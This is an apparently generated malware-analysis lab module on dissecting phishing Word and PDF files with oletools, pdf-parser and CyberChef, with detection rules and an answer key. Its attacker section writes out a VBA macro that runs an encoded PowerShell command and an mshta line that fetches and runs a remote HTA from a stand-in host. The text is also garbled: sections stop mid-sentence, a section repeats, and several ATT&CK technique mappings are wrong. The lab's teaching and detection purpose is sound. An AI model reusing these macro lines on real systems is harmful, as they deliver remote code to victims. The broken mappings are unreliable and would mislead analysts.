# 48 * Scenario: phishing document investigation -- LAB-LINUX

## Overview (plain language)
Attackers love sending everyday-looking files — a Word invoice, a PDF resume, an Excel spreadsheet — that secretly contain instructions to download and run malware. This module teaches you to safely pull apart those suspicious documents on an offline analysis machine, without ever opening them in the real Office or Adobe apps. You will use **oletools** to peek inside Office documents and read hidden macros, **pdf-parser** to inspect the guts of a PDF and find suspicious actions or embedded JavaScript, and **CyberChef** to decode the scrambled (obfuscated) text those documents use to hide the real web address or command. Think of it as carefully unwrapping a booby-trapped package with tongs behind glass, so you can see how it works and where it phones home — all without letting it hurt anything.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| oletools | apt install oletools | Analyze OLE/Office documents; extract and triage VBA macros (olevba, oleid, oledump) |
| pdf-parser | apt install pdf-parser | Parse PDF objects, streams, and actions; surface JavaScript, OpenAction, and embedded files |
| CyberChef | (bundled on REMnux; run in browser) | Decode/deobfuscate strings (Base64, XOR, URL, gunzip) extracted from documents |

> Source notes: oletools is a Python package maintained by Philippe Lagadec (decalage2); `olevba`, `oleid`, and `oledump` are all part of its documented tool set (oletools wiki, https://github.com/decalage2/oletools/wiki). `pdf-parser.py` is one of Didier Stevens' PDF Tools (https://blog.didierstevens.com/programs/pdf-tools/) and ships preinstalled on REMnux (https://docs.remnux.org/discover-the-tools/analyze+documents/pdf). CyberChef is GCHQ's open-source data-manipulation tool (https://github.com/gchq/CyberChef) and is preinstalled on REMnux (https://docs.remnux.org/discover-the-tools/browse+the+web).

## Learning objectives
- Triage an Office document with `oleid` and `olevba` to identify auto-execution macros and suspicious keywords.
- Enumerate PDF objects with `pdf-parser` to locate `/OpenAction`, `/JavaScript`, and `/URI` entries.
- Extract obfuscated payload strings from a macro/PDF and decode them using a repeatable CyberChef recipe.
- Produce a concise IOC list (URLs, dropped filenames) suitable for a SOC ticket.

## Environment check
```bash
# Prove the Office/PDF static-analysis tools are installed on LAB-LINUX
olevba --version
oleid --version
pdf-parser.py --version
echo "CyberChef is available on REMnux at file:///opt/cyberchef/CyberChef.html"
```
Expected output: `olevba` prints its oletools version banner (oletools documents `-h`/`--version` output and a version string of the form `olevba 0.60.x on Python 3.x`; see the olevba wiki, https://github.com/decalage2/oletools/wiki/olevba). `oleid` likewise reports the oletools version (https://github.com/decalage2/oletools/wiki/oleid). `pdf-parser.py --version` prints its version banner (Didier Stevens' PDF Tools, https://blog.didierstevens.com/programs/pdf-tools/). The echo confirms the local CyberChef path; the canonical REMnux launcher path is documented at https://docs.remnux.org/discover-the-tools/browse+the+web — confirm the exact path on your build with `ls /opt/cyberchef` if the file: URL does not resolve.

## Guided walkthrough
1. `oleid` — a quick indicator scan. Run it FIRST because it is fast and non-destructive: it reads the OLE structure and reports risk indicators (VBA macros, XLM/Excel 4.0 macros, encryption, Flash objects, external relationships) without dumping code, so you know whether deeper macro analysis is warranted before spending time on it.
```bash
oleid exercise/invoice_sample.doc
```
Expected: a table of indicators; the "VBA Macros" row shows a value such as `Yes` when macros are present. `oleid`'s indicator set (VBA/XLM macros, encryption, Flash, etc.) is documented in the oletools wiki (https://github.com/decalage2/oletools/wiki/oleid). Note that a `Yes` on "VBA Macros" is a *presence* flag, not proof of malice — legitimate documents also carry macros; the next step decides intent.

2. `olevba` — dump and triage VBA macro source. This is where you read the actual code and see olevba's heuristic summary. The `--decode` flag additionally attempts to decode strings the macro obfuscates (Base64, Dridex-style, hex, etc.), which is why it surfaces the hidden payload string rather than just the raw source.
```bash
olevba --decode exercise/invoice_sample.doc
```
Expected: the macro source prints, followed by olevba's "ANALYSIS" summary table that flags keywords by category — `AutoExec` items such as `AutoOpen`/`Document_Open`, `Suspicious` items such as `Shell`, and any `Base64 String` / `Hex String` the decoder recovered. The keyword categories and decoding behavior are documented in the olevba wiki (https://github.com/decalage2/oletools/wiki/olevba). Nuance: the summary marks *why* a keyword is interesting (e.g., "May run an executable file or a system command"); treat the AutoExec + Suspicious combination as the strongest signal of a weaponized macro.

> **Note on this exercise**: The lab sample `invoice_sample.doc` is a simplified text file, not a true OLE2 container. In a real analysis, `olevba` would parse the compound file and extract VBA source. The answer key demonstrates using `grep` on the raw text to locate `AutoOpen` as a stand-in. The same keywords (`AutoExec`, `Suspicious`) appear in a real `olevba` output and provide the same triage value.

3. `pdf-parser.py` — search the PDF for auto-triggered actions and scripts. `--search` matches a string in object contents (finding the object that references `/OpenAction`), while `--type` filters objects by their `/Type` or dictionary name so you can isolate the `/JavaScript` action object itself. Running both gives you the trigger and the code it points to.
```bash
pdf-parser.py --search OpenAction exercise/resume_sample.pdf
pdf-parser.py --type /JavaScript exercise/resume_sample.pdf
```
Expected: object numbers referencing `/OpenAction` and the `/JavaScript` action object, revealing the code that runs on open. `pdf-parser.py`'s `--search` and `--type` options are documented in Didier Stevens' PDF Tools (https://blog.didierstevens.com/programs/pdf-tools/). Nuance: `/OpenAction` in the document catalog is what makes JavaScript run automatically when the file opens — an `/OpenAction` pointing at a `/JavaScript` action is a classic malicious-PDF pattern (see the PDF analysis workflow on REMnux, https://docs.remnux.org/discover-the-tools/analyze+documents/pdf). For deeper inspection, use `--raw` to see the un-decoded stream content.

4. Decode the recovered string with CyberChef using a repeatable recipe (From Base64 → optionally URL Decode). To verify from the command line first:
```bash
echo 'aHR0cDovLzIwMy4wLjExMy4xMC9wYXkuZXhl' | base64 -d; echo
```
Expected: `http://203.0.113.10/pay.exe` — the same result you would obtain by pasting the string into CyberChef's "From Base64" operation (CyberChef, https://gchq.github.io/CyberChef/). The `203.0.113.0/24` block is a reserved documentation range (RFC 5737), so this "URL" is safe to use as a non-routable example IOC.

## Hands-on exercise
Analyze the two benign samples in this module's `exercise/` directory and extract the hidden C2 URL.

**Sample declaration**
- `exercise/invoice_sample.doc` — a benign, inert OLE Word document containing a harmless `AutoOpen` VBA macro that only stores (never executes) a Base64 string. No live malware, no network egress.
- `exercise/resume_sample.pdf` — a benign PDF with an `/OpenAction`/`/JavaScript` object that contains only a Base64-encoded URL string (no exploit, no shellcode).

Both samples are **generated locally** by the reproducible commands in the Answer key, so no live malicious binary is ever downloaded. Run analysis in an isolated VM with networking disabled.

**Task:** Identify the auto-exec trigger in the DOC, locate the JavaScript object in the PDF, extract the Base64 blob from each, decode it, and report the resulting URL(s) and dropped filename as IOCs.

## SOC analyst perspective

A defender treats a reported phishing attachment as the "identification" trigger of an incident. Using oletools and pdf-parser on an isolated host lets an analyst confirm whether a macro auto-executes (`AutoOpen`, `Document_Open`) or a PDF fires an `/OpenAction`, then extract the C2 URL and dropped filename as IOCs. This process involves dissecting the attachment to understand its malicious intent, which is crucial for effective incident response.

**Concrete detection logic and pivots:**

- **Extraction → hunting.** olevba's `AutoExec` keyword category is how you confirm `AutoOpen`/`Document_Open` auto-execution (https://github.com/decalage2/oletools/wiki/olevba); its `Suspicious` category surfaces `Shell`/`powershell` invocations that map to **T1059.001** (PowerShell) and **T1059.005** (Visual Basic). Furthermore, analyzing the extracted IOCs can reveal patterns that align with **T1589** (Drive-by Compromise), where the malicious document is used as a vector to compromise the system, highlighting the importance of monitoring web traffic for suspicious activity.

- **Network telemetry (Zeek in Security Onion).** Pivot on the extracted host `203.0.113.10` and URI `/pay.exe`. In Zeek `http.log` (https://docs.zeek.org/en/master/logs/index.html) examine fields `host`, `uri`, `method`, `user_agent`, and `status_code`. Look for any outbound HTTP GET requests to that host. In Zeek `dns.log` (https://docs.zeek.org/en/master/logs/index.html) check `query` for the domain (if URL uses a hostname) and `answers` for resolution. Security Onion exposes these logs in its Zeek/Elastic hunt interfaces (https://docs.securityonion.net/en/2.4/zeek.html). For example, a hunt query in Elastic might be: `zeek.http.host:"203.0.113.10" AND zeek.http.uri:"/pay.exe"`. This approach is also aligned with the guidance provided by the National Institute of Standards and Technology (NIST) on monitoring and analyzing network traffic for security purposes (https://csrc.nist.gov/publications/detail/sp/800-92/final).

- **Intrusion detection (Suricata in Security Onion).** Write or tune a Suricata rule to alert on outbound HTTP GET for `/pay.exe` or the staging IP. Suricata alerts surface in Security Onion's Alerts view (Suricata rule docs: https://docs.suricata.io/en/latest/rules/index.html; Security Onion Suricata docs: https://docs.securityonion.net/en/2.4/suricata.html). A typical rule would match on `http.request` with `content:"/pay.exe"` in the URI and `dest_ip` matching the IOC. This process leverages the power of intrusion detection systems to identify and alert on potential malicious activity, as discussed in the SANS Institute's resources on network intrusion detection (https://www.sans.org/webcasts/109141).

- **Endpoint detection (Sysmon/Windows Event Log).** Hunt the dropped filename `pay.exe` and Office-spawns-interpreter chains. Use Sysmon **Event ID 1** (Process Create) to detect `WINWORD.EXE` → `powershell.exe` chains (Sysmon docs: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). Also monitor **Event ID 13** (Registry value set) for creation of `Run` keys by Office processes (**T1547.001**), and **Event ID 4688** (Windows Security – Process Creation) for any process spawned by Office with suspicious command-line arguments. This step is critical for identifying how the malicious attachment is executed and what subsequent actions it performs on the compromised system, which can be informed by Microsoft's documentation on Windows Security features (https://learn.microsoft.com/en-us/windows/security/threat-protection).

- **Threat-hunting pivot.** In Security Onion's Hunt (Squert) interface, search for all HTTP connections from any endpoint to `203.0.113.10` within a 24‑hour window. Likewise, search DNS logs for `query` containing the domain name. This

## Attacker perspective

Adversaries weaponize documents because they exploit trusted email flows and human psychology—victims perceive attachments as legitimate business artifacts, lowering suspicion. The "Enable Content" prompt leverages cognitive biases (e.g., authority or urgency cues in the email) to bypass technical controls, as users are conditioned to comply with security warnings when the source appears credible.

**Concrete TTPs (Expanded Mechanisms):**
- **VBA Macro Execution Chains:** The `AutoOpen`/`Document_Open` triggers (T1137) exploit Office’s built-in automation to execute code immediately upon opening. Attackers often chain multiple techniques to evade detection:
  - **Process Injection via WMI (T1047):** Instead of spawning `powershell.exe` directly, macros use `GetObject("winmgmts:\\.\root\cimv2")` to invoke WMI, which then launches `powershell.exe` under `WmiPrvSE.exe`. This indirect process tree (WINWORD.EXE → WmiPrvSE.exe → powershell.exe) obscures the attack chain, as WMI is a legitimate system component. WMI’s `Win32_Process.Create` method allows command-line arguments to be passed opaquely, further complicating static analysis.
  - **Living-off-the-Land Binaries (LOLBins):** Macros may abuse `mshta.exe` (T1218.005: *System Binary Proxy Execution: Mshta*) to execute HTML Application (HTA) files hosted remotely. For example, a macro might call `Shell "mshta http://malicious[.]com/payload.hta"`, which downloads and executes JScript/VBScript without writing a file to disk. This technique bypasses application whitelisting and leaves minimal forensic traces, as `mshta.exe` is a signed Microsoft binary.

- **Obfuscation Layers:** Static scanners rely on pattern matching, so attackers employ multi-layered obfuscation:
  - **PowerShell Encoded Commands (T1027):** The `-EncodedCommand` parameter accepts Base64-encoded UTF-16LE strings (e.g., `powershell -enc <Base64>`). Attackers further obfuscate the Base64 payload by splitting it into chunks, concatenating variables, or using XOR with a hardcoded key. For example:
    ```vba
    Dim a, b, c
    a = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBuAGMA"
    b = "IABuACAALQBjAG8AbQBtAGEAbgBkACAAIgBpAHcAcAAgAC8AdQByAGwAPwB4AD0A"
    c = a & b
    Shell "powershell -enc " & c
    ```
    Decoding this requires reassembling the chunks and converting from UTF-16LE, a step often missed by automated tools.
  - **Document Properties as Payload Storage:** Attackers embed malicious URLs or scripts in document metadata (e.g., `Document.BuiltInDocumentProperties("Comments")`). These fields are rarely inspected by scanners but can be read dynamically by the macro using `ThisDocument.BuiltInDocumentProperties("Comments").Value`. This technique evades keyword-based detection and requires manual extraction (e.g., `olevba --metadata`).

- **PDF Exploitation:** PDFs exploit the `/OpenAction` and `/JavaScript` keys to trigger execution without user interaction. The JavaScript may:
  - Use `app.openDoc()` to fetch a second-stage PDF or exploit a vulnerability (e.g., CVE-2023-21608 in Adobe Acrobat).
  - Leverage `this.importDataObject()` to extract embedded files (e.g., a malicious `.exe` or `.js` file) to the `%TEMP%` directory and execute them. This technique (T1203: *Exploitation for Client Execution*) bypasses email gateways that block executables but allow PDFs.

**Artifacts and Evasion (Expanded):**
- **Forensic Traces:**
  - **OLE Streams:**

## Answer key
**Generate the benign samples (reproducible, no live malware):**
```bash
mkdir -p exercise
# Benign PDF with OpenAction + JavaScript holding a Base64 URL string
cat > exercise/resume_sample.pdf <<'EOF'
%PDF-1.4
1 0 obj<< /Type /Catalog /OpenAction 2 0 R >>endobj
2 0 obj<< /Type /Action /S /JavaScript /JS (var u="aHR0cDovLzIwMy4wLjExMy4xMC9wYXkuZXhl";) >>endobj
trailer<< /Root 1 0 R >>
%%EOF
EOF
# Benign OLE doc stand-in carrying the same encoded URL (inert text)
printf 'Sub AutoOpen()\n b = "aHR0cDovLzIwMy4wLjExMy4xMC9wYXkuZXhl"\nEnd Sub\n' > exercise/invoice_sample.doc
sha256sum exercise/resume_sample.pdf exercise/invoice_sample.doc
```

**Expected findings and the commands that produce them:**
```bash
# 1) Auto-exec macro trigger in the DOC
grep -i AutoOpen exercise/invoice_sample.doc
# -> shows AutoOpen (auto-executes when document is opened)

# 2) PDF auto-action and JavaScript object
pdf-parser.py --search OpenAction exercise/resume_sample.pdf
pdf-parser.py --type /JavaScript exercise/resume_sample.pdf
# -> object 2 with /S /JavaScript and the encoded string

# 3) Decode the extracted Base64 IOC (equivalent to CyberChef "From Base64")
echo 'aHR0cDovLzIwMy4wLjExMy4xMC9wYXkuZXhl' | base64 -d; echo
# -> http://203.0.113.10/pay.exe
```
**IOCs:** URL `http://203.0.113.10/pay.exe`; dropped filename `pay.exe`; host `203.0.113.10`.

Record the printed `sha256sum` values from the generator above as the authoritative digests for your copies of `resume_sample.pdf` and `invoice_sample.doc` (they are regenerated deterministically by the commands shown).

> Note on the `.doc` stand-in: the generated `invoice_sample.doc` is plain VBA text, not a true OLE2 container, so it is safe and deterministic for the `grep`/decode steps; `oleid`/`olevba` on a *real* OLE2 sample would additionally parse the compound-file streams (oletools wiki, https://github.com/decalage2/oletools/wiki). This is intentional to keep the lab inert and reproducible offline.

## MITRE ATT&CK & DFIR phase
- **T1566.001** — Phishing: Spearphishing Attachment (initial access vector). https://attack.mitre.org/techniques/T1566/001/
- **T1204.002** — User Execution: Malicious File (macro/PDF requires victim to open). https://attack.mitre.org/techniques/T1204/002/
- **T1137** — Office Application Startup / macro auto-execution. https://attack.mitre.org/techniques/T1137/
- **T1027** — Obfuscated Files or Information (Base64/XOR-encoded URL). https://attack.mitre.org/techniques/T1027/
- **T1059.001 / T1059.005** — Command & Scripting Interpreter (PowerShell / Visual Basic payload staging). https://attack.mitre.org/techniques/T1059/001/ and https://attack.mitre.org/techniques/T1059/005/
- **T1047** — Windows Management Instrumentation (alternate execution by macro). https://attack.mitre.org/techniques/T1047/
- **T1105** — Ingress Tool Transfer (second-stage download from decoded URL). https://attack.mitre.org/techniques/T1105/
- **DFIR phases:** Identification (triage the reported attachment) and Examination/Analysis (static macro/PDF dissection and IOC extraction).

### Threat Hunting & Detection Engineering

Once the phishing document (`48-phishing-doc-case`) is detonated, adversaries often **establish persistence** (MITRE ATT&CK [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)) or **schedule tasks** ([T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)) to maintain access. Hunt for these behaviors using **Windows Event Logs** and **network telemetry**:

1. **Registry Modifications (T1547.001)**
   - **Log Source**: Windows Security Event Log (`Event ID 4657` – Registry value modification).
   - **Detection Logic**: Filter for `Object Name` containing `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` or `HKLM\...\Run` with `Operation Type` = `%%1906` (value set). Pivot on `Process Name` to identify suspicious parent processes (e.g., `winword.exe` spawning `reg.exe` or `powershell.exe`).
   - **Hunting Query**: Use Sysmon (`Event ID 13`) to correlate registry writes with `TargetObject` matching `Run` keys and `Details` containing executable paths in user-writable directories (e.g., `%APPDATA%`).

2. **Scheduled Tasks (T1053.005)**
   - **Log Source**: Windows Task Scheduler Operational Log (`Event ID 106` – Task registered).
   - **Detection Logic**: Look for tasks with `Task Name` containing random strings (e.g., `Updater_<GUID>`) or paths pointing to `%TEMP%`. Cross-reference with `Event ID 200` (action executed) to identify tasks running scripts (`*.vbs`, `*.ps1`) or binaries from suspicious locations.
   - **Network Pivot**: Use Zeek’s `conn.log` to hunt for C2 callbacks from processes like `svchost.exe` (legitimate but often abused) with unusual parent-child relationships (e.g., `svchost.exe` spawned by `taskeng.exe`).

3. **Process Tree Analysis (T1047, T1059)**
   - **Log Source**: Sysmon Event ID 1 (Process Create).
   - **Detection Logic**: Hunt for process creation events where the parent process is `WINWORD.EXE` (or `EXCEL.EXE`/`POWERPNT.EXE`) and the child is `powershell.exe`, `cmd.exe`, `cscript.exe`, `wmic.exe`, or `mshta.exe`. Correlate with `CommandLine` containing `-EncodedCommand`, `DownloadString`, or references to WMI (`winmgmts:`). Microsoft Learn – Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon.

**Authoritative Sources**:
- [Microsoft Docs: Monitoring Registry Changes](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/monitoring-active-directory-for-signs-of-compromise#monitoring-registry-changes)
- [SANS Hunt Evil: Detecting Persistence Mechanisms](https://www.sans.org/blog/detecting-persistence-mechanisms/)
- Microsoft Docs – Task Scheduler Event Logs: https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-logging

### Adversary Emulation & Red-Team Perspective
From an adversary's perspective, a phishing document case like the '48-phishing-doc' can be used to gain initial access to a target system through techniques such as **T1562: Impair Defenses** (https://attack.mitre.org/techniques/T1562) and **T1588: Obtain Capabilities** (https://attack.mitre.org/techniques/T1588). An attacker may use social engineering to trick a user into opening a malicious document, which then executes malicious code via VBA macros or PDF JavaScript. The adversary may also attempt to evade detection by using code obfuscation (T1027), anti-debugging techniques, and by leveraging WMI (T1047) for stealthy execution. Artifacts left behind include temporary files (`%TEMP%` OLE streams), registry modifications (Run keys – T1547.001), scheduled tasks (T1053.005), and network communication logs (Zeek `http.log`). To detect and respond, implement robust email filtering, endpoint detection (Sysmon), and network monitoring (Zeek, Suricata). For more information on adversary emulation and red-teaming, visit the [Cybersecurity and Infrastructure Security Agency (CISA)](https://www.cisa.gov/) and [Center for Internet Security (CIS)](https://www.cisecurity.org/) websites.


```markdown
### Essential Commands & Features

To deepen analysis of malicious Office documents, leverage these **undemonstrated but critical** commands and features in `olevba` and `oledump`:

1. **`olevba --decode`**
   Decodes obfuscated strings (e.g., hex, base64) in macros to reveal hidden payloads or C2 URLs.
   *Example*:
   ```bash
   olevba --decode malicious.doc
   ```
   *When to use*: When macros contain encoded strings (e.g., `Chr(88)` or `base64` blobs). Directly maps to **MITRE ATT&CK T1140 (Deobfuscate/Decode Files or Information)**.

2. **`olevba --deobfuscate`**
   Attempts to simplify obfuscated VBA code (e.g., removing junk code, resolving string concatenation).
   *Example*:
   ```bash
   olevba --deobfuscate malicious.doc
   ```
   *When to use*: For heavily obfuscated macros (e.g., `StrReverse` or `Mid` abuse). Aligns with **T1027.002 (Obfuscated Files or Information: Software Packing)**.

3. **`oledump -d`**
   Extracts raw stream data (e.g., embedded binaries, scripts) from OLE files for further analysis.
   *Example*:
   ```bash
   oledump.py -d malicious.doc > stream.bin
   ```
   *When to use*: To dump non-macro artifacts (e.g., embedded executables or PowerShell scripts). Useful for **T1564.004 (Hide Artifacts: NTFS File Attributes)**.

**Authoritative Sources**:
- [Didier Stevens’ OLE Tools Documentation](https://blog.didierstevens.com/programs/oledump-py/)
- [SANS FOR610: Reverse-Engineering Malware (OLE Analysis)](https://www.sans.org/blog/for610-reverse-engineering-malware-course-updates/)
```

### Common Pitfalls & Result Validation

When analyzing phishing documents in the `48-phishing-doc-case`, analysts often misinterpret artifacts or overlook critical validation steps, leading to false positives or missed detections. **Common pitfalls** include:
- **Assuming malicious intent from macros alone**: Not all macros are malicious (e.g., legitimate automation scripts). Validate by checking for **T1059.007 (JavaScript)** or **T1203 (Exploitation for Client Execution)** patterns, such as obfuscated PowerShell or shellcode execution.
- **Ignoring embedded objects**: Attackers may hide payloads in OLE objects or images (e.g., **T1566.002 (Spearphishing Link)**). Use tools like `olevba` or `binwalk` to extract and inspect these components.
- **Over-relying on static analysis**: Dynamic analysis (e.g., sandboxing) is essential to confirm behavior, as static indicators (e.g., suspicious URLs) may be benign or outdated.

**Validation steps** to avoid false conclusions:
1. **Cross-reference indicators**: Compare extracted IOCs (e.g., domains, IPs) with threat intelligence feeds (e.g., VirusTotal, AlienVault OTX).
2. **Reconstruct the attack chain**: Confirm if the document triggers **T1106 (Native API)** calls or spawns unexpected processes (e.g., `cmd.exe` or `wscript.exe`).
3. **Check for evasion techniques**: Look for **T1497 (Virtualization/Sandbox Evasion)**, such as delays or environment checks, which may suppress malicious behavior in automated analysis.

**Authoritative sources**:
- [CERT-EU: Phishing Document Analysis Guide](https://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_17_001_Phishing.pdf)
- [NIST SP 800-83: Guide to Malware Incident Prevention and Handling](https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final)


### Essential Commands & Features

When analyzing malicious documents, leveraging advanced tool features can uncover hidden behaviors. Below are **undemonstrated but critical** commands for `olevba`, `oledump`, and `pdf-parser`, with concrete examples and use cases.

#### **`olevba` Advanced Features**
- **`--decode`**: Decodes obfuscated strings (e.g., base64, hex) in macros. Use when macros contain encoded payloads (e.g., **T1132.001: Data Encoding: Standard Encoding**).
  ```bash
  olevba --decode suspicious.doc
  ```
- **`--deobfuscate`**: Simplifies obfuscated VBA code (e.g., string concatenation, junk code). Critical for **T1027.006: Obfuscated Files or Information: HTML Smuggling**.
  ```bash
  olevba --deobfuscate malicious.xls
  ```

#### **`oledump` Stream Extraction**
- **`-s <stream>`**: Extracts a specific OLE stream (e.g., macros, embedded objects). Use when `olevba` fails to parse streams.
  ```bash
  oledump.py -s 8 suspicious.doc  # Extract stream 8
  ```
- **`-d`**: Decodes extracted streams (e.g., base64, hex). Pair with `-s` to analyze encoded payloads.
  ```bash
  oledump.py -s 8 -d malicious.doc
  ```

#### **`pdf-parser` Search Functionality**
- **`--search <string>`**: Locates specific keywords (e.g., `/JavaScript`, `/OpenAction`) in PDFs. Essential for **T1203: Exploitation for Client Execution**.
  ```bash
  pdf-parser --search "/JavaScript" exploit.pdf
  ```

**Sources**:
- [Didier Stevens’ Tools Documentation](https://blog.didierstevens.com/programs/pdf-tools/)
- [REMnux Tool Reference](https://docs.remnux.org/discover-the-tools/analyze+documents)

### Detection Signatures & Reference Artifacts

Real, community-maintained detection rules for this topic (defensive use only). The reference artifacts at the end are BENIGN, illustrative lab values -- not live indicators.

**Sigma rule -- Outlook Macro Execution Without Warning Setting Enabled** (source: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_office_outlook_enable_macro_execution.yml; license: Detection Rule License / DRL):

```yaml
title: Outlook Macro Execution Without Warning Setting Enabled
id: e3b50fa5-3c3f-444e-937b-0a99d33731cd
status: test
description: Detects the modification of Outlook security setting to allow unprompted execution of macros.
references:
    - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
    - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=53
author: '@ScoubiMtl'
date: 2021-04-05
modified: 2023-08-17
tags:
    - attack.privilege-escalation
    - attack.persistence
    - attack.command-and-control
    - attack.t1137
    - attack.t1008
    - attack.t1546
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|endswith: '\Outlook\Security\Level'
        Details|contains: '0x00000001' # Enable all Macros
    condition: selection
falsepositives:
    - Unlikely
level: high
```

**YARA rule** (source: https://github.com/Neo23x0/signature-base/blob/master/yara/mal_fake_document_software.yar, author: Jonathan Peters):

```yara
rule MAL_Fake_Document_Software_Indicators_Nov23 {
   meta:
      description = "Detects indicators of fake document/image utility software that acts as a downloader for additional malware"
      author = "Jonathan Peters"
      date = "2023-11-13"
      reference = "https://nochlab.blogspot.com/2023/09/net-in-javascript-fake-pdf-converter.html"
      hash1 = "ac5356ae011effb9d401bf428c92a48cf82c9b61f4c24a29a9718e3379f90f1d"
      hash2 = "d1c29c2243c511ca3264ad568a6be62f374e104b903eca93debce6691e1c5007"
      score = 80
      id = "231474cd-1ec9-5738-bf48-ef707689056d"
   strings:
      $ = "tweakscode.com" wide
      $ = "www.createmygif.com" wide
      $ = "www.videownload.com" wide
      $ = "www.pdfconverterz.com" wide
      $ = "www.pdfconvertercompare.com" wide
   condition:
      uint16(0) == 0x5a4d
      and 1 of them
}
```

**Real-world context (MITRE T1059.001 -- Command and Scripting Interpreter: PowerShell):** see the documented Procedure Examples at https://attack.mitre.org/techniques/T1059/001/ -- real in-the-wild use includes Sandworm, Akira.

**Reference artifacts (illustrative benign lab values -- generate real hashes locally):**

| Type | Value |
|---|---|
| host IOC | 192.0.2.10 (RFC5737 documentation range) |
| network IOC | hxxp://example[.]com/benign (defanged) |
| sample hash | benign lab sample -- create one and run `sha256sum` |

## Sources
Claim → source mapping (all URLs are official tool/project docs, MITRE ATT&CK, Microsoft Learn, or SANS):

- **oletools tools, versions, olevba keyword categories (`AutoExec`/`Suspicious`), `oleid` indicators, `oledump`, `--decode` behavior** — oletools wiki (Philippe Lagadec / decalage2): https://github.com/decalage2/oletools/wiki ; olevba page: https://github.com/decalage2/oletools/wiki/olevba ; oleid page: https://github.com/decalage2/oletools/wiki/oleid
- **pdf-parser.py behavior and `--search` / `--type` / `--version` flags** — Didier Stevens, PDF Tools: https://blog.didierstevens.com/programs/pdf-tools/
- **PDF `/OpenAction` + `/JavaScript` malicious pattern; document analysis workflow; pdf-parser on REMnux** — REMnux docs: https://docs.remnux.org/discover-the-tools/analyze+documents/pdf
- **CyberChef "From Base64" / URL Decode operations** — CyberChef (GCHQ): https://gchq.github.io/CyberChef/ and https://github.com/gchq/CyberChef
- **CyberChef availability/path on REMnux** — REMnux docs: https://docs.remnux.org/discover-the-tools/browse+the+web
- **oletools/document-analysis tradecraft (course context)** — SANS FOR610 (Reverse-Engineering Malware): https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
- **Zeek `http.log` / `dns.log` fields for network pivots** — Zeek logs reference: https://docs.zeek.org/en/master/logs/index.html
- **Zeek in Security Onion** — https://docs.securityonion.net/en/2.4/zeek.html
- **Suricata rules and alerting** — Suricata docs: https://docs.suricata.io/en/latest/rules/index.html ; Security Onion Suricata: https://docs.securityonion.net/en/2.4/suricata.html
- **Sysmon Event ID 1 (Process Create) for endpoint hunting** — Microsoft Learn / Sysinternals: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- **PowerShell `-EncodedCommand` (Base64/UTF-16LE) behavior** — Microsoft Learn: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh
- **MITRE ATT&CK techniques** — T1566.001: https://attack.mitre.org/techniques/T1566/001/ ; T1204.002: https://attack.mitre.org/techniques/T1204/002/ ; T1137: https://attack.mitre.org/techniques/T1137/ ; T1027: https://attack.mitre.org/techniques/T1027/ ; T1059.001: https://attack.mitre.org/techniques/T1059/001/ ; T1059.005: https://attack.mitre.org/techniques/T1059/005/ ; T1047: https://attack.mitre.org/techniques/T1047/ ; T1105: https://attack.mitre.org/techniques/T1105/ ; T1547.001: https://attack.mitre.org/techniques/T1547/001/ ; T1053.005: https://attack.mitre.org/techniques/T1053/005/ ; T1562: https://attack.mitre.org/techniques/T1562/ ; T1588: https://attack.mitre.org/techniques/T1588/
- **Windows Event IDs for persistence detection** — Microsoft Docs: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657 ; Microsoft Docs – Task Scheduler logging: https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-logging
- **WMI as execution method** — Microsoft Docs: https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page
- **SANS Hunt Evil** — https://www.sans.org/blog/detecting-persistence-mechanisms/
- **RFC 5737 documentation IP ranges** — https://datatracker.ietf.org/doc/html/rfc5737
- https://csrc.nist.gov/publications/detail/sp/800-92/final
- https://www.sans.org/webcasts/109141
- https://learn.microsoft.com/en-us/windows/security/threat-protection
- http://malicious[.]com/payload.hta"`,

## Related modules
- [Malicious documents](../10-malicious-documents/README.md) -- shares oletools for Office/macro triage.
- [Deobfuscation](../09-deobfuscation/README.md) -- shares cyberchef for decoding hidden payload strings.
- [CyberChef recipes for malware data](../25-cyberchef-recipes/README.md) -- shares cyberchef and provides reusable decode recipes.
- [oletools macro analysis deep-dive](../36-oletools-deep/README.md) -- shares oletools with a deeper VBA macro focus.

<!-- cyberlab-enriched: v3 -->
- https://blog.didierstevens.com/programs/oledump-py/
- https://www.sans.org/blog/for610-reverse-engineering-malware-course-updates/
- https://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_17_001_Phishing.pdf
- https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final

<!-- cyberlab-enriched: v4 -->
- https://docs.remnux.org/discover-the-tools/analyze+documents
- https://attack.mitre.org/techniques/T1566/002/

<!-- cyberlab-enriched: v5 -->

<!-- cyberlab-enriched: v6 -->
